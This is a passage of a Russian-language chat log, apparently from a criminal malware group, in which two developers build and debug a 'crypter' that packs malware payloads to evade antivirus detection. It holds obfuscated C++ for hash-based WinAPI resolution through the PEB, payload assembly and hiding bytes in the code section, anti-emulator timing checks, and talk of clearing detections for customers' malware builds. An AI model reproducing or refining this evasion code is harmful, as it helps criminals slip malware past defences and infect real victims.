		pGetDateFormatA(LOCALE_USER_DEFAULT, 0, NULL, _STR("yyyy"), datebuf, sizeof(datebuf));
		datebuf[0] -= 0x30; datebuf[0] *= 10;
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		funcPtr = *((ULONG_PTR*)funcArray + i);
		funcPtr += (100 + datebuf[0] + i * 10);
		// <codeobfuscator:end_block>

		// <codeobfuscator:begin_block>
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t k = 0; k < tmp.size();) {
		resBuf[idx] = tempChar[k];
		idx++;
		k++;
	}
		// <codeobfuscator:end_block>
	}

	// <codeobfuscator:begin_block>
	globBufStruct BuffersData[] = GLOB_DATA_PAYLOAD_BUFS;
	for (globBufStruct data : BuffersData) {

		for (size_t j = 0; j < data.size; j++) {
			resBuf[idx] = data.data[j];
			idx++;
		}

	}
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function>
	writeFile((char*)"cryptorPayload", resBuf, ENCRYPT_PAYLOAD_SIZE);
	return resBuf;
}
```
[08.09.21 14:42:08] basil:		немножко твоей положительной кармы впитал
[08.09.21 14:42:11] basil:		Спасибо
[08.09.21 14:42:17] elroy:		))
[08.09.21 14:42:52] elroy:		Мне бы тоже не помешало
[08.09.21 14:43:10] basil:		ну давай. Попрорбуем обменяться
[08.09.21 14:43:15] basil:		Что не работает
[08.09.21 14:43:17] basil:		?
[08.09.21 14:43:18] elroy:		Переписал код InitializeWinApi, все рассыпалось. Не могу собрать
[08.09.21 14:43:29] basil:		какая ветка?
[08.09.21 14:43:40] elroy:		Верней, собрать могу, не работает теперь
[08.09.21 14:43:45] elroy:		Локально
[08.09.21 14:44:48] basil:		ну я не знаю. Может какой-то участок кода вышлешь? Но одназначно положительный астральный заряд я уже тебе послал
[08.09.21 14:47:57] elroy:		Ну глянь оригинальный код функции
[08.09.21 14:48:14] elroy:		
[08.09.21 14:48:53] basil:		это png?
[08.09.21 14:49:32] elroy:		не, это мусор
[08.09.21 14:49:33] elroy:		момент)
[08.09.21 14:49:39] elroy:		```
init_mem_complete:
	// <codeobfuscator:begin_block>
	Mask = 0;
	Ldr = CONTAINING_RECORD(Peb->Ldr->ModuleListMemoryOrder.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the first entry (process executable)
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the ntdll
	Ldr = CONTAINING_RECORD(Ldr->InMemoryOrderModuleList.Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList.Flink); // Get the kernel32
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
#define pINH ((PIMAGE_NT_HEADERS)RVATOVA(Ldr->DllBase, ((PIMAGE_DOS_HEADER)Ldr->DllBase)->e_lfanew))
#define pIOH ((PIMAGE_OPTIONAL_HEADER)((BYTE*)pINH + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)))
#define pIED ((IMAGE_EXPORT_DIRECTORY*)RVATOVA(Ldr->DllBase, pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
#define WA_Function ((PDWORD)RVATOVA(Ldr->DllBase, pIED->AddressOfFunctions))
#define WA_Name ((DWORD*)RVATOVA(Ldr->DllBase, pIED->AddressOfNames))
	Ordinal = (WORD*)RVATOVA(Ldr->DllBase, pIED->AddressOfNameOrdinals);
	// <codeobfuscator:end_block>

custom_cycle_continue:
	i++;
	if (i < pIED->NumberOfNames)
	{
		// <codeobfuscator:begin_block>
		ptr = (PUCHAR)Ldr->DllBase + WA_Name[i];
		// <codeobfuscator:end_block>
		
		// <codeobfuscator:begin_block>
		Hash = 0;
		while (*ptr) // Compute the hash
		{
			Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
			ptr++;
		}
		// <codeobfuscator:end_block>

		if (Mask == M_INIT_ALL)
		{	
			//if (Hash == hash_ExitProcess)
			//{
			//	// <codeobfuscator:begin_block>
			//	memset((BYTE*)Ldr->DllBase + WA_Function[Ordinal[i]], 0, sizeof(ULONG_PTR));
			//	ExitProcess(0);
			//	// <codeobfuscator:end_block>
			//	goto custom_cycle_continue;
			//}
			//goto custom_cycle_continue;

			if (Hash == hash_Sleep)
			{
				// <codeobfuscator:begin_block>
				WA->dSleep = (tSleep)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_HeapFree)
			{
				// <codeobfuscator:begin_block>
				WA->dHeapFree = (tHeapFree)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_GetModuleHandleW)
			{
				// <codeobfuscator:begin_block>
				WA->dGetModuleHandleW = (tGetModuleHandleW)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_VirtualAlloc)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualAlloc = (tVirtualAlloc)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_VirtualProtect)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualProtect = (tVirtualProtect)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_VirtualQuery)
			{
				// <codeobfuscator:begin_block>
				WA->dVirtualQuery = (tVirtualQuery)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_ExitProcess)
			{
				// <codeobfuscator:begin_block>
				WA->dExitProcess = (tExitProcess)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
```
[08.09.21 14:49:50] elroy:		```	
			if (Hash == hash_GetCurrentProcess)
			{
				// <codeobfuscator:begin_block>
				WA->dGetCurrentProcess = (tGetCurrentProcess)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_ExitThread)
			{
				// <codeobfuscator:begin_block>
				WA->dExitThread = (tExitThread)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_QueryPerformanceFrequency)
			{
				// <codeobfuscator:begin_block>
				WA->dQueryPerformanceFrequency = (tQueryPerformance)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}
			
			if (Hash == hash_QueryPerformanceCounter)
			{
				// <codeobfuscator:begin_block>
				WA->dQueryPerformanceCounter = (tQueryPerformance)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_LoadLibraryA)
			{
				// <codeobfuscator:begin_block>
				WA->dLoadLibraryA = (tLoadLibraryA)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

			if (Hash == hash_GetProcAddress)
			{
				// <codeobfuscator:begin_block>
				WA->dGetProcAddress = (tGetProcAddress)CURR_FUNC;
				// <codeobfuscator:end_block>
				goto custom_cycle_continue;
			}

		}
		else
		{
			if (Hash == hash_HeapAlloc)
			{
				// <codeobfuscator:begin_block>
				dHeapAlloc = (tHeapAlloc)CURR_FUNC;
				Mask |= M_LoadLibraryA;
				// <codeobfuscator:end_block>
			}
			
			if (Hash == hash_GetProcessHeap)
			{
				// <codeobfuscator:begin_block>
				dGetProcessHeap = (tGetProcessHeap)CURR_FUNC;
				Mask |= M_GetProcAddress;
				// <codeobfuscator:end_block>				
			}

			if (Mask == M_INIT_ALL)
			{
				HANDLE H = dGetProcessHeap();
				pWA = (WinApi*)dHeapAlloc(H, 0, sizeof(WinApi) + GETAPI_KEY % 4096);
				
				// <codeobfuscator:begin_block>
				WA = pWA;
				WA->dHeapAlloc		= dHeapAlloc;
				WA->dGetProcessHeap = dGetProcessHeap;
				// <codeobfuscator:end_block>

				i = -1;
			}
		}
		goto custom_cycle_continue;
	}
```
[08.09.21 14:50:18] elroy:		Соственно, переписал цикл
[08.09.21 14:50:53] elroy:		И заменил на define те переменные
[08.09.21 14:51:00] elroy:		Выгна их из стека
[08.09.21 14:52:05] elroy:		```
pWA = (WinApi*)dHeapAlloc(H, 0, sizeof(WinApi) + GETAPI_KEY % 4096);
```			
вот тут ловится исключение
[08.09.21 14:52:25] basil:		смотрю
[08.09.21 14:52:26] elroy:		Не могу понять почему, буд-то не тот адрес извлекается
[08.09.21 14:56:06] basil:		i инициализируется?
[08.09.21 14:57:51] elroy:		Да, вот тут в цике корректно отображаются имена и хеши отрабатывают
```
// <codeobfuscator:begin_block>
		ptr = (PUCHAR)Ldr->DllBase + WA_Name[i];
		// <codeobfuscator:end_block>
		
		// <codeobfuscator:begin_block>
		Hash = 0;
		while (*ptr) // Compute the hash
		{
			Hash = ((Hash << 8) + Hash + *ptr) ^ (*ptr << 16);
			ptr++;
		}
		// <codeobfuscator:end_block>
```
[08.09.21 14:57:59] elroy:		Т.е. корректно
[08.09.21 14:58:26] elroy:		* i корректно
[08.09.21 15:01:06] basil:		нет. зараза. Не вижу
[08.09.21 15:01:54] elroy:		Вот тут код, который должен работать, но не работает. Как тебе удвется заставлять работать код, который не должен)))
[08.09.21 15:02:53] basil:		сейчас заработает , вот увидишь)))
[08.09.21 15:04:00] basil:		а насчет работает у меня то что не должно... Даже не знаю что и ответить, кроме как "дуракам везет"
[08.09.21 15:04:04] basil:		Наверное так
[08.09.21 15:06:23] elroy:		Да не, не дуракам
[08.09.21 15:06:52] basil:		ОООООООООооооооооооо. Бальзам на мою израненую душу
[08.09.21 15:07:23] basil:		Слушай. Сделай "вход" - попей кофе
[08.09.21 15:07:40] basil:		Ну уже видимо гипноз ошибки пошел у тебя
[08.09.21 15:07:50] elroy:		Да нет ее там)
[08.09.21 15:08:03] elroy:		Вот сейчас запустил, пршелся отладчиком
[08.09.21 15:08:11] basil:		А это не важно есть она или нет
[08.09.21 15:08:26] elroy:		GetProcessHeap() вернулся, а HeapAlloc - access denied
[08.09.21 15:08:32] basil:		важно как ты ее воспринимаешь!
[08.09.21 15:08:46] basil:		Я тебе абсолютно серьезно говорю
[08.09.21 15:09:00] elroy:		"Видишь ошибку? - Нет. А она есть"
[08.09.21 15:09:08] elroy:		))
[08.09.21 15:09:36] basil:		[громкий истерический смех]
[08.09.21 15:10:10] basil:		Ты сейчас круче сказал, чем "криптер сам чистится. Живой!"
[08.09.21 15:52:28] elroy:		
[08.09.21 15:52:46] elroy:		Он действительно вызвад HeapAlloc и упал
[08.09.21 15:52:49] elroy:		Класс!!!
[08.09.21 15:53:37] basil:		бывает....
[08.09.21 15:54:00] basil:		что делать
[08.09.21 15:54:10] elroy:		Я думал там адрес не работает. Нет, адрес работает
[08.09.21 15:54:27] basil:		у меня тоже отвалилось... Очередной раз...
[08.09.21 15:54:38] elroy:		А фиг его знает. Загадка...
[08.09.21 15:54:39] basil:		Так что видимо не в карме дело
[08.09.21 15:56:04] basil:		Знаешь мне всегда кажется что когда ты пишешь "загадка" ,то мечтательно поднимаешь глаза к небу
[08.09.21 15:56:27] basil:		есть у меня такое мнение
[08.09.21 15:57:31] basil:		ну да ладно .... Видимо не рыбный сегодня день
[08.09.21 15:58:26] basil:		у меня тоже сегодня все из рук валится
[08.09.21 15:59:01] elroy:		Да, смотрел на небо, но там нет ответа
[08.09.21 15:59:26] elroy:		Нельзя вызывать HeapAlloc
[08.09.21 15:59:31] elroy:		Не положено
[08.09.21 16:00:16] basil:		)))
[08.09.21 16:00:54] basil:		я сейчас отойду. Буду уже ближе к 21,00 по МСК
[09.09.21 12:51:45] basil:		Приветствую
[09.09.21 12:51:57] elroy:		Приветствую
[09.09.21 12:53:22] basil:		Получилось избавиться от stl в buildPayload. Ошибка была в:
```
		std::vector<char> tmp = ((BufFunc)funcPtr)(&size);
		char* tempChar = tmp.data();
		for (size_t k = 0; k < size; k++) 
			resBuf[idx++] = tempChar[k];
```
[09.09.21 12:53:47] basil:		почему-то размер данных в vector был некорректнет
[09.09.21 12:53:59] basil:		если использовать for (size_t k = 0; k < size; k++)
[09.09.21 12:54:03] basil:		вместо
[09.09.21 12:54:20] basil:		for (size_t k = 0; k < tmp.size(); k++)
[09.09.21 12:54:28] basil:		То все работает
[09.09.21 12:55:19] basil:		сделал 8 билдов отработали корректно. Сейчас удаляю vector, как объект храгнения данных в секции кода
[09.09.21 12:55:32] basil:		данных нагрузки
[09.09.21 12:55:40] elroy:		```
std::vector<char> tmp 
```
А это не stl? Это останется? Ничего не пойму)
[09.09.21 12:56:21] basil:		Сейчас да. Но я сейчас переделываю SolutionBuilder по той схеме , которую ты вчера предложил.
[09.09.21 12:56:59] basil:		std::vector<char> tmp  уйдет
[09.09.21 12:57:14] elroy:		Ага, это хорошо
[09.09.21 12:57:37] elroy:		Там есть класс Represent, его переделываешь?
[09.09.21 12:57:47] basil:		Так точно
[09.09.21 12:58:02] elroy:		Надо не переделывать, а просто расширить его
[09.09.21 12:58:40] elroy:		class ReprFunc_VectorChar : public Represent
Точно так же сделать нового наследника
[09.09.21 12:59:12] basil:		и переопределить методы?
[09.09.21 12:59:20] elroy:		Да
[09.09.21 12:59:26] elroy:		Потом вызывать его
[09.09.21 12:59:44] elroy:		Так можно вперемешку наделать разные метоы представления
[09.09.21 13:00:31] basil:		Согласен. Можно. Единственное есть маленькое рационализаторское предложение
[09.09.21 13:04:11] basil:		мне кажется что патчить криптер в секции кода, для того что бы там потом хранилась нагрузка не очень правильно. Мне думается что лучше как-то так:
```
char* getPayloadBlockFromTextSect(){
char*  blockData=malloc(BLOCK_SIZE);
blockData[0]=1;
blockData[1]=3;
.....
blockData[BLOCK_SIZE-1]=10;
return blockData;
}
```
[09.09.21 13:04:23] basil:		Не против?
[09.09.21 13:05:22] elroy:		Если это будет в секции кода: =1, то не против, а если оно улетит в секцию констант, то против
[09.09.21 13:05:39] basil:		Оно будет в секции кода
[09.09.21 13:05:50] basil:		Пока именно так и происходило. Пробовал
[09.09.21 13:06:03] elroy:		Делай, посмотрим что получится
[09.09.21 13:06:07] basil:		Ок
[09.09.21 13:06:35] elroy:		blockData[i++]
[09.09.21 13:06:39] elroy:		Сделай так
[09.09.21 13:06:50] elroy:		Или как вариант и так и так
[09.09.21 13:07:07] elroy:		Мне там просто константы не нравятся
[09.09.21 13:07:24] basil:		да. согласен. Полиморфизм будет выше
[09.09.21 13:07:51] elroy:		Если с константами, то тогда не подряд, а вперемешку
[09.09.21 13:08:16] elroy:		blockData[18]=3
blockData[153]=8
...
[09.09.21 13:08:45] basil:		да. кстати говоря. так я не подумал. Ок. Хорошее предложение
[09.09.21 13:09:20] elroy:		Еще один положительный отзыв о криптере
[09.09.21 13:09:46] elroy:		manuel написал сегодня:
```
А получится почистить? Там мужики только твоим стабом могут некоторые сетки взять
Другими стабами не заходят
```
[09.09.21 13:10:32] basil:		Бальцам! Бальзам.....
[09.09.21 13:10:39] basil:		На мою израненую душу
[09.09.21 13:11:02] basil:		Я представлю что будет кода перейдем к обфускации в ран тайм
[09.09.21 13:11:11] basil:		Бальзам!*
[09.09.21 13:11:20] elroy:		Кстати да
[09.09.21 13:11:41] elroy:		сейчас вот не очень новости, детекты все висят на crt, на функция векторов
[09.09.21 13:12:06] elroy:		Я сегодня почистил случайно dll, выдал ему. Говорит, там довольны))
[09.09.21 13:12:47] basil:		Ну должно заработать . Должен crt уйти
[09.09.21 13:13:01] basil:		Там вроде и осталось не много
[09.09.21 13:13:04] elroy:		А почистил случайно, поменял процент соотношения ксор/арифм. и шаг мусорного кода в репрезент
[09.09.21 13:14:30] elroy:		Вчера таки победил тот HeapAlloc, заменил на VirtualAlloc, выделилась память, все отработало. А HeapAlloc перестал работать для переделанных WinApi.
Но когда все заработало, детект вернулся))
[09.09.21 13:14:37] elroy:		Чертов эмулятор...
[09.09.21 13:16:13] basil:		Все равно победим! За успех нашего БЕЗНАДЕЖНОГО дела! Я уже послал тебе свой астральный заряд)))
[09.09.21 13:16:26] basil:		И вообще сделай "вход"
[09.09.21 13:17:03] elroy:		Скоро решето будет, уже куча вхдов, а выхода все нет...
[09.09.21 13:17:43] basil:		Хотел как лучше... Думал настроение повысить. Только из благих побуждений
[09.09.21 13:18:14] elroy:		Я знаю)
[09.09.21 13:18:26] elroy:		Попробую с 2021 студией
[09.09.21 13:18:32] elroy:		Может уйдет детект
[09.09.21 13:19:41] basil:		А такая есть? Я не знал
[09.09.21 13:19:56] basil:		Кинешь ссылку? Тоже себе поставлю
[09.09.21 13:20:00] elroy:		21 год заканчивается..
[09.09.21 13:20:49] elroy:		https://visualstudio.microsoft.com/vs/preview/
[09.09.21 13:21:05] elroy:		Это 2022, в preview еще
[09.09.21 13:21:25] elroy:		Инструкция на скачивание оффлайн версии полной такая же
[09.09.21 13:21:40] basil:		Спасибо))
[09.09.21 13:21:53] elroy:		vs_enterprise.exe --layout G:\VSLayout --all --lang en-US
[09.09.21 13:22:34] basil:		ок
[09.09.21 14:13:04] elroy:		На 2022 студии собрался читсый. Детекты на crt точно были)
[09.09.21 14:13:33] basil:		Погоди. Не понял
[09.09.21 14:13:45] basil:		собрался на 2022 чистый
[09.09.21 14:14:15] basil:		но если собирать на 2019 то есть детекты на crt. Я правильно понял?
[09.09.21 14:14:23] elroy:		Да
[09.09.21 14:14:53] basil:		тогда получается что он как-то по другому seh компилирует
[09.09.21 14:15:13] elroy:		Один и тот ж код собираем с разными crt, в одном случае есть детекты, в другом - нет. Вопрос, на коде детекты или на crt ?)
[09.09.21 14:15:36] elroy:		Там не только seh
[09.09.21 14:16:19] basil:		наверное это как-то взяимосвязано. Из формы кода проистекает crt. Или нет?
[09.09.21 14:16:35] basil:		просто видимо теперь crt другое
[09.09.21 14:16:42] basil:		Сигнатура измениласьт
[09.09.21 14:16:51] basil:		хотя производиться все тоже самое
[09.09.21 14:18:02] elroy:		По моим наблюдениям, компилятор сует функции, реализующие функционал векторов. Аллокаторы и т.д. В зависимости от использования в коде векторов и операций над ними, формируется список функций, которые компилятор и сует. И наверное их порядок.
[09.09.21 14:19:08] basil:		Ну я все равно поздравляю с победой
[09.09.21 14:19:33] elroy:		Работает вручную.. Какой-то баг с компиляцие скриптом
[09.09.21 14:20:12] elroy:		SolutionBuilder вызывает студию на компиляцю проекта, и сообщение "путь не найден". Фиг знает что это такое
[09.09.21 14:20:18] elroy:		Я пути правил
[09.09.21 14:21:30] basil:		ну это же я так понимаю не критично. По сравнению с детектами. Так сказать дело техники
[09.09.21 14:22:01] elroy:		Если не заработает, то критично
[09.09.21 14:23:03] basil:		Заработает.
[09.09.21 14:23:08] basil:		никуда не денется
[09.09.21 14:24:37] elroy:		Да, ты прав
[09.09.21 14:25:04] elroy:		Пути не правильно поправил. Везде две косые, а в одном месте - одна, не тот символ)
[09.09.21 14:25:17] elroy:		Заведу пожалуй еще профиль.
[09.09.21 14:25:46] elroy:		Ты для версии без crt заводил профиль в config.h ?
[09.09.21 14:26:30] basil:		на текущий момент. Мне бы код для начала отладить и все таки убить этот crt
[09.09.21 14:26:44] basil:		на текущий момент нет*
[09.09.21 14:26:57] elroy:		ок
[10.09.21 11:09:05] basil:		Приветствую
[10.09.21 11:23:16] basil:		Ну в общем удалось убрать vector из криптре. Протестировал работает. Сейчас в процессе конфигурации проекта. И перевода его полностью на "режим" без crt
[10.09.21 11:30:58] elroy:		Приветствую
[10.09.21 11:31:06] elroy:		Это радует
[10.09.21 11:31:15] elroy:		Промежуточный вариант сделаешь?
[10.09.21 11:31:52] basil:		что подразумевается под "промежуточный вариант"?
[10.09.21 11:31:59] basil:		я просто не понимаю
[10.09.21 11:32:09] elroy:		Без вектора, но еще с crt
[10.09.21 11:32:17] basil:		ну могу конечно
[10.09.21 11:32:25] basil:		по веткам надо разливать?
[10.09.21 11:32:26] elroy:		Сделай, нужен
[10.09.21 11:33:20] elroy:		Жалательно. Можно свою текущую векту подготовитьь до работы без вектора, потом сказать мне коммит и продолжить работать дальше. Я заберу это в develop
[10.09.21 11:33:42] basil:		хорошой. сейчас займусь
[10.09.21 11:34:56] elroy:		> по веткам надо разливать?
разливать не надо)
[10.09.21 11:35:07] elroy:		Я прочитал "реализовать"
[10.09.21 11:35:16] basil:		ок. хорошо
[10.09.21 11:39:32] basil:		слушай , ну тут удалось , вроде как, без конфликтов влить develop в develop_not_crt_crypter. Может слить влить полученную ветку в develop и закинуть все это на сервер?
[10.09.21 12:04:07] elroy:		Я сам волью
[10.09.21 12:04:15] elroy:		Перепроверю еще)
[10.09.21 12:04:23] elroy:		Какой коммит?
[10.09.21 12:05:33] basil:		full_deleted_vector_from_UniCrypterProj ветка develop_not_crt_crypter
[10.09.21 12:05:47] elroy:		спасибо
[10.09.21 12:49:00] elroy:		Посмотрел код, заберу в develop. Но тебе у себя стоит обновить develop, не увидел в новой ветке часть доработок, видимо твоя версия develop не так свежа
[10.09.21 12:49:36] basil:		хорошо
[10.09.21 12:57:37] elroy:		У меня сейчас собрался файл размером 8 мегабайт, вместо 1.3
[10.09.21 12:57:45] elroy:		Ужас! )))
[10.09.21 12:58:08] basil:		Да?
[10.09.21 12:58:15] basil:		Нифига себе!
[10.09.21 12:59:18] basil:		это от чего такое!?
[10.09.21 12:59:22] basil:		Не понятно?
[10.09.21 12:59:47] elroy:		наверное от этого
```
blockData[16187]=(char)-17;
    blockData[6541]=(char)-35;
    blockData[26177]=(char)-16;
    blockData[20596]=(char)-11;
```
[10.09.21 13:00:17] basil:		Так вектор вроде похожее что - то делает
[10.09.21 13:00:32] basil:		Или он как-то по другому делает?
[10.09.21 13:00:48] elroy:		Ну знаю даже...
[10.09.21 13:00:58] elroy:		Но там последний раз был вектор по 8 байт
[10.09.21 13:01:04] elroy:		а не по одному
[10.09.21 13:01:17] elroy:		Может пожтому
[10.09.21 13:01:20] basil:		и размер в 8 раз увеличился
[10.09.21 13:01:26] basil:		кстати говоря
[10.09.21 13:01:27] elroy:		Да)
[10.09.21 13:02:01] basil:		я как-то не обратил внимание. Собрался-отработал и уже вроде нормальнол
[10.09.21 13:02:11] elroy:		Ладно, занимайся crt, сделаю по 8 байт за раз
[10.09.21 13:02:26] elroy:		efrain был бы в ярости)))
[10.09.21 13:02:40] elroy:		Им до 300 кб надо крипт
[10.09.21 13:02:48] basil:		А он по каким вопросам? Или заказчик?
[10.09.21 13:02:57] elroy:		Тестер
[10.09.21 13:03:11] elroy:		Делает у нас крипты под трика
[10.09.21 13:03:33] elroy:		И нашим не пользуется, закзачику надо было раньше до 100 кб, сейчас до 300 кб
[10.09.21 13:03:55] elroy:		Но 8 мб - перебор. Недавно silver установил лимит для крипта - до 1 мб
[10.09.21 13:04:29] basil:		Ну 8 мб... Да много. Хорошо , что ты обратил внимание....
[10.09.21 13:04:40] basil:		Откуда у меня все это появляется
[10.09.21 13:05:23] basil:		при сборке без ctr более 100 ошибок
[10.09.21 13:05:48] basil:		И самое неприятно даже не пишет где они
[10.09.21 13:05:55] basil:		Ошибка линковки
[10.09.21 13:06:04] elroy:		А ты уверен, что код, который написал, рабботает правильно? Я про запаковку
[10.09.21 13:06:29] basil:		Я его тестировал. 8 сборок подряд
[10.09.21 13:06:35] basil:		все отработали
[10.09.21 13:06:50] basil:		больше делать не стал
[10.09.21 13:07:12] elroy:		Я сейчас сдела поиск
```
blockData[10375]
```
в payload.cpp
И нашел несколько таких строк, куда присваивается разные значения. В чем поддвох?
[10.09.21 13:07:51] basil:		это из одной функции?
[10.09.21 13:08:00] elroy:		Из разных
[10.09.21 13:08:21] basil:		так и должно быть. Блоки то разные и разные данные
[10.09.21 13:09:05] elroy:		А, логично. Да)
[10.09.21 13:10:05] elroy:		Блин, да. Кинулось случайно в глаза. Заметил же один и тот же индекс...
[10.09.21 13:11:12] basil:		но я индексы перемешиваю. Что бы они последовательно не шли. Вчера вроде про это говорили.
[10.09.21 13:11:23] elroy:		Да
[10.09.21 13:11:40] elroy:		Дает видимо прирост размера еще и цифра
[10.09.21 13:11:54] elroy:		Ппробую на 8 байт сделать, посмотрим что получится
[10.09.21 13:12:15] basil:		наверное индекс этот столько сместа забирает
[10.09.21 13:12:27] basil:		но вот не заметил честно говоря
[10.09.21 13:12:35] basil:		хорошо. что ты обратил внимание
[10.09.21 13:13:14] elroy:		Да, навреное...
Может имеет смысл сделать рандом какого-то числа подряд, 20 например, но наращивать блоки
[10.09.21 13:13:39] elroy:		Ладно, разберись с црт. Смотри. Там можт не собираться из-за простейшего
[10.09.21 13:13:49] elroy:		Например из-за = { 0 };
[10.09.21 13:13:58] elroy:		Это оно не нашло memcpy
[10.09.21 13:14:23] elroy:		Или memset
[10.09.21 13:14:42] elroy:		Надо заменить на m_memset и заменит выражение
[10.09.21 13:14:52] basil:		эти (memcpy и memset) тоже есть
[10.09.21 13:15:41] basil:		надо еще CodeWrapper переписывать там есть оператор try и еще какие-то моменты
[10.09.21 13:15:49] basil:		из std
[10.09.21 13:17:43] elroy:		Надо. try можно выкинуть, думаю. Надо чем-то заменить...
[10.09.21 13:18:12] basil:		делею. Делаю....
[13.09.21 12:43:36] elroy:		Приветствую
[13.09.21 12:44:02] basil:		Приветствую
[13.09.21 12:44:18] elroy:		Наставление от silver на тему как засунуть массив куда угодно в коде с помощью макросов
```
 в быстром старте есть как это сделать

#pragma code_seg(push, ".text")
#pragma code_seg(pop)
unsigned char __declspec(allocate(".text")) hiddencode[]={ ... };
```
[13.09.21 12:45:16] elroy:		```
можно засунуть массив в любую секцию, или разложить несколькими кусками по секциям, с целью равномерно распределить энтропию и все, у тебя в массиве есть твой бинарь, делай что угодно
```
[13.09.21 12:46:04] basil:		теперь получается , что и разделить ее можно в нужной пропорции по секциям
[13.09.21 12:46:35] basil:		а в какую часть секции он поместит данные? Известно?
[13.09.21 12:47:32] elroy:		Даже не знаю
[13.09.21 12:47:36] elroy:		Надо просто попробовать
[13.09.21 12:47:38] elroy:		Можешь?
[13.09.21 12:47:47] basil:		хорошо. Вопрос есть
[13.09.21 12:47:51] elroy:		Да
[13.09.21 12:47:58] basil:		несколько по другой тематике
[13.09.21 12:49:52] basil:		Я сейчас все сижу с crt. Очень медленно, каждый шаг с боем. Компилятор не указывет где происходи ошибка. Только линковщик ругается. Причем опять же не указывает место. Я подумал и решил , что аозможно дизассемблером смогу найти места на которые он ругается.
[13.09.21 12:49:57] basil:		Но вот ведь незадача
[13.09.21 12:50:48] basil:		Вроде собрал криптер с отладочной информацией. Есть PDB файл. А IDA ругается - дескать неизвестный формат.
[13.09.21 12:50:56] basil:		Но раньше я его подгружал
[13.09.21 12:51:01] basil:		пробем не было
[13.09.21 12:51:20] basil:		```
<< It appears that MS DIA SDK is not installed.
Please try installing "Microsoft Visual C++ 2008 Redistributable Package / x86" >>
```
[13.09.21 12:52:12] basil:		Я уже все что мог наустанавливал. И эта проблема к тому же относится и к чистке. Может наведешь на какую мысль?
[13.09.21 12:52:53] basil:		Как можно корректно подгрузить отладочную информацию
[13.09.21 12:56:47] basil:		Вот заработало
[13.09.21 12:56:53] elroy:		Такая ошибка бывает из-за типа отладочной информации. Попробуй разные варианты типа информации.
Попробуй при сборке указать, что хранить в базе данных программы.
Важно чтобы путь соответствовал.
[13.09.21 12:56:55] basil:		Видимо твоя карма
[13.09.21 12:57:01] elroy:		))
[13.09.21 12:57:09] basil:		я не шучу
[13.09.21 12:57:14] basil:		вот только что
[13.09.21 12:57:18] elroy:		Но мне не поняно что ты в иду загружать собрался, если файл не собрался?
[13.09.21 12:58:11] elroy:		В таком случае стратегия очень простая. Надо закомментить весь код, и раскомменчивать поочередно. Увидишь где конкретно что появляется
[13.09.21 12:58:59] basil:		Нет .так не получиться очень много ошибок. Ну мне так  кажется
[13.09.21 12:59:17] basil:		там надо делать так. Сначала собираем с ctr. Далее в свойствах проекта отключаем. Линковщик показывает где ошибка с точностью до функции
[13.09.21 12:59:52] basil:		И какая функция из crt там используется.
[13.09.21 13:00:15] basil:		Далее в дизассемблере смотрим где конкретно она вызывается
[13.09.21 13:00:36] basil:		Я уже этим способом несколько мест нашел.
[13.09.21 13:01:14] basil:		Ну моежт необычно у меня все это происходит. Впрочем как и всегда.
[13.09.21 13:01:30] elroy:		Хорошая стратегия, хорошо, что нашел способ)
[13.09.21 13:01:38] elroy:		Был рад поделиться аурой))
[13.09.21 13:01:47] basil:		)))
[13.09.21 13:01:50] basil:		спасибо
[13.09.21 13:01:56] basil:		И за ауру тоже)))
[13.09.21 14:00:09] elroy:		Я обратил внимание, что ты со второй половины онлайн. Решил пробелму с доступом?
[13.09.21 14:01:10] basil:		сейчас попроще стало . Но гарантировать , что это будет постоянно не могу
[13.09.21 14:04:59] basil:		Единственное...
[13.09.21 14:05:43] basil:		На время твоего отсутсвия. Я гарантировано с 12,20 по МСК в буду в сети. Дальше практика покажет
[13.09.21 14:06:08] elroy:		Хорошо.
[14.09.21 10:49:19] basil:		Приветствую
[14.09.21 10:49:36] elroy:		Приветствую
[14.09.21 10:50:21] basil:		Тут сидел с crt. Точнее с избавлением от него возник маленький вопрос
[14.09.21 10:50:34] basil:		Момент
[14.09.21 10:51:28] basil:		есть функция measure2()
[14.09.21 10:51:53] basil:		Там же как я понимаю детектирование эмуляции идет?
[14.09.21 10:52:07] elroy:		Да
[14.09.21 10:53:27] basil:		Так вот. При приведении типов , особоенно, при привидении вещественного числа к целочисленному например здесь:
```
		if (!WA->dQueryPerformanceCounter(&li))
			continue;
		fPerfStep2 = static_cast<double>(li.QuadPart);
```
[14.09.21 10:53:44] basil:		используются библиотеки crt
[14.09.21 10:54:02] basil:		теоретически можно сделать так
[14.09.21 10:55:26] basil:		```
		DWORD64 temp = li.QuadPart;
		fPerfStep2 = 0;
		for (; temp>0; temp--)
			fPerfStep2++;
```
